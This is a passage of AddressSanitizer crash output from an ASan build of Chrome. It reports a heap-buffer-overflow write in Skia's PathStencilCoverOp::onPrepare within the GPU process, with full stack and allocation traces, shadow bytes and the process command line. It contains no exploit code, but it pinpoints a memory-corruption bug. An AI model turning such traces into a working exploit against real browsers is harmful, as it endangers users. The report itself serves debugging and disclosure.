    #10 0x6399907d572f in gpu::SharedContextState::FlushWriteAccess(gpu::SkiaImageRepresentation::ScopedWriteAccess*) gpu/command_buffer/service/shared_context_state.cc:860:9
    #11 0x639990a935c7 in gpu::raster::RasterDecoderImpl::DoEndRasterCHROMIUM() gpu/command_buffer/service/raster_decoder.cc:3085:30
    #12 0x639990a8dade in gpu::raster::RasterDecoderImpl::HandleEndRasterCHROMIUM(unsigned int, void const volatile*) gpu/command_buffer/service/raster_decoder_autogen.h:151:3
    #13 0x639990a9869b in gpu::error::Error gpu::raster::RasterDecoderImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/raster_decoder.cc:1512:18
    #14 0x63997a135804 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:267:35
    #15 0x6399902080db in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:504:22
    #16 0x639990207341 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:173:7
    #17 0x63999022a45c in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:833:13
    #18 0x639990238447 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:740:12
    #19 0x639990238229 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:956:5
    #20 0x63997a178201 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/callback.h:155:12
    #21 0x63997a14c947 in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>) base/functional/callback.h:155:12
    #22 0x63997a14a978 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:625:3
    #23 0x63997a14e561 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #24 0x639986c95ad6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #25 0x639986d0d289 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #26 0x639986d0c0fa in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #27 0x639986b552c7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #28 0x639986d0e997 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #29 0x639986c11070 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #30 0x6399925b28bc in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #31 0x63998291c70f in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #32 0x63998291da3f in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #33 0x639982920748 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1152:10
    #34 0x63998291a121 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #35 0x63998291a71c in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #36 0x63996f4c1b39 in ChromeMain chrome/app/chrome_main.cc:191:12
    #37 0x76ba6762a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #38 0x76ba6762a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #39 0x63996f3e7029 in _start (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029) (BuildId: c307cc2e19af7361)

0x72ba1897c820 is located 0 bytes after 3145760-byte region [0x72ba1867c800,0x72ba1897c820)
allocated by thread T0 (chrome) here:
    #0 0x63996f4c03fd in operator new(unsigned long) (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6e3fd) (BuildId: c307cc2e19af7361)
    #1 0x639988fd7751 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:29:20
    #2 0x639988fd876d in GrBufferAllocPool::resetCpuData(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #3 0x639988fda2d4 in GrBufferAllocPool::createBlock(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #4 0x639988fd968e in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #5 0x639988fdbac8 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #6 0x639989255129 in GrEagerDynamicVertexAllocator::lock(unsigned long, int) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.cpp:20:31
    #7 0x6399892510d0 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.h:39:25
    #8 0x639989206162 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #9 0x63998924501a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #10 0x639989030f8a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #11 0x639988fcb72b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #12 0x639988fc9bd3 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #13 0x639988fccb90 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #14 0x639988fc5359 in GrDirectContextPriv::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.cpp:90:47
    #15 0x639988f669bb in GrDirectContext::flush(SkSurface*, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.h:106:22
    #16 0x6399892e9007 in skgpu::ganesh::Flush(SkSurface*) third_party/skia/src/gpu/ganesh/surface/SkSurface_Ganesh.cpp:759:45
    #17 0x6399907d572f in gpu::SharedContextState::FlushWriteAccess(gpu::SkiaImageRepresentation::ScopedWriteAccess*) gpu/command_buffer/service/shared_context_state.cc:860:9
    #18 0x639990a935c7 in gpu::raster::RasterDecoderImpl::DoEndRasterCHROMIUM() gpu/command_buffer/service/raster_decoder.cc:3085:30
    #19 0x639990a8dade in gpu::raster::RasterDecoderImpl::HandleEndRasterCHROMIUM(unsigned int, void const volatile*) gpu/command_buffer/service/raster_decoder_autogen.h:151:3
    #20 0x639990a9869b in gpu::error::Error gpu::raster::RasterDecoderImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/raster_decoder.cc:1512:18
    #21 0x63997a135804 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:267:35
    #22 0x6399902080db in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:504:22
    #23 0x639990207341 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:173:7
    #24 0x63999022a45c in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:833:13
    #25 0x639990238447 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:740:12
    #26 0x639990238229 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:956:5
    #27 0x63997a178201 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/callback.h:155:12

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/skia/src/gpu/BufferWriter.h:92:9 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
Shadow bytes around the buggy address:
  0x72ba1897c580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1897c600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1897c680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1897c700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x72ba1897c780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x72ba1897c800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1897c880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1897c900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1897c980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1897ca00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x72ba1897ca80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==15622==ADDITIONAL INFO

==15622==Note: Please include this section with the ASan report.
Task trace:
    #0 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #1 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #2 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #3 0x63997a14ae52 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=15040 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAABARAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,7884004447984177761,14685516043287976015,262144 --field-trial-handle=3,i,1065319797526636146,7725492769041559239,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,14663162623263158245,3497144085525861933,4 --trace-process-track-uuid=3190708995682289984`


==15622==END OF ADDITIONAL INFO

==15622==ABORTING
[15036:15036:0310/103026.736947:ERROR:content/browser/gpu/gpu_process_host.cc:999] GPU process exited unexpectedly: exit_code=256
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[15756:15756:0310/103027.146868:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:252] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
=================================================================
==15756==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x72ba1896f820 at pc 0x6399892528ff bp 0x7fffecbbce70 sp 0x7fffecbbce68
WRITE of size 8 at 0x72ba1896f820 thread T0 (chrome)
    #0 0x6399892528fe in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/BufferWriter.h:92:9
    #1 0x639989206162 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #2 0x63998924501a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #3 0x639989030f8a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #4 0x639988fcb72b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #5 0x639988fc9bd3 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #6 0x639988fccb90 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #7 0x639988fc5359 in GrDirectContextPriv::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.cpp:90:47
    #8 0x639988f669bb in GrDirectContext::flush(SkSurface*, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.h:106:22
    #9 0x6399892e9007 in skgpu::ganesh::Flush(SkSurface*) third_party/skia/src/gpu/ganesh/surface/SkSurface_Ganesh.cpp:759:45
    #10 0x6399907d572f in gpu::SharedContextState::FlushWriteAccess(gpu::SkiaImageRepresentation::ScopedWriteAccess*) gpu/command_buffer/service/shared_context_state.cc:860:9
    #11 0x639990a935c7 in gpu::raster::RasterDecoderImpl::DoEndRasterCHROMIUM() gpu/command_buffer/service/raster_decoder.cc:3085:30
    #12 0x639990a8dade in gpu::raster::RasterDecoderImpl::HandleEndRasterCHROMIUM(unsigned int, void const volatile*) gpu/command_buffer/service/raster_decoder_autogen.h:151:3
    #13 0x639990a9869b in gpu::error::Error gpu::raster::RasterDecoderImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*) gpu/command_buffer/service/raster_decoder.cc:1512:18
    #14 0x63997a135804 in gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*) gpu/command_buffer/service/command_buffer_service.cc:267:35
    #15 0x6399902080db in gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&) gpu/ipc/service/command_buffer_stub.cc:504:22
    #16 0x639990207341 in gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/command_buffer_stub.cc:173:7
    #17 0x63999022a45c in gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*) gpu/ipc/service/gpu_channel.cc:833:13
    #18 0x639990238447 in void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&) base/functional/bind_internal.h:740:12
    #19 0x639990238229 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*) base/functional/bind_internal.h:956:5
    #20 0x63997a178201 in void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, gpu::FenceSyncReleaseDelegate*>, base::internal::BindState<false, true, true, base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (gpu::FenceSyncReleaseDelegate*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<gpu::FenceSyncReleaseDelegate, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>) base/functional/callback.h:155:12
    #21 0x63997a14c947 in gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>) base/functional/callback.h:155:12
    #22 0x63997a14a978 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:625:3
    #23 0x63997a14e561 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::Scheduler::*&&)(), gpu::Scheduler*>, base::internal::BindState<true, true, false, void (gpu::Scheduler::*)(), base::internal::UnretainedWrapper<gpu::Scheduler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #24 0x639986c95ad6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #25 0x639986d0d289 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #26 0x639986d0c0fa in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #27 0x639986b552c7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #28 0x639986d0e997 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #29 0x639986c11070 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #30 0x6399925b28bc in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #31 0x63998291c70f in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #32 0x63998291da3f in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #33 0x639982920748 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1152:10
    #34 0x63998291a121 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #35 0x63998291a71c in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #36 0x63996f4c1b39 in ChromeMain chrome/app/chrome_main.cc:191:12
    #37 0x76ba6762a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #38 0x76ba6762a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #39 0x63996f3e7029 in _start (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10e95029) (BuildId: c307cc2e19af7361)

0x72ba1896f820 is located 0 bytes after 3145760-byte region [0x72ba1866f800,0x72ba1896f820)
allocated by thread T0 (chrome) here:
    #0 0x63996f4c03fd in operator new(unsigned long) (/home/FOO/BAR/Chrome/linux-release_asan/chrome+0x10f6e3fd) (BuildId: c307cc2e19af7361)
    #1 0x639988fd7751 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:29:20
    #2 0x639988fd876d in GrBufferAllocPool::resetCpuData(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #3 0x639988fda2d4 in GrBufferAllocPool::createBlock(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #4 0x639988fd968e in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #5 0x639988fdbac8 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #6 0x639989255129 in GrEagerDynamicVertexAllocator::lock(unsigned long, int) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.cpp:20:31
    #7 0x6399892510d0 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.h:39:25
    #8 0x639989206162 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #9 0x63998924501a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #10 0x639989030f8a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #11 0x639988fcb72b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #12 0x639988fc9bd3 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #13 0x639988fccb90 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #14 0x639988fc5359 in GrDirectContextPriv::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.cpp:90:47
    #15 0x639988f669bb in GrDirectContext::flush(SkSurface*, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDirectContextPriv.h:106:22
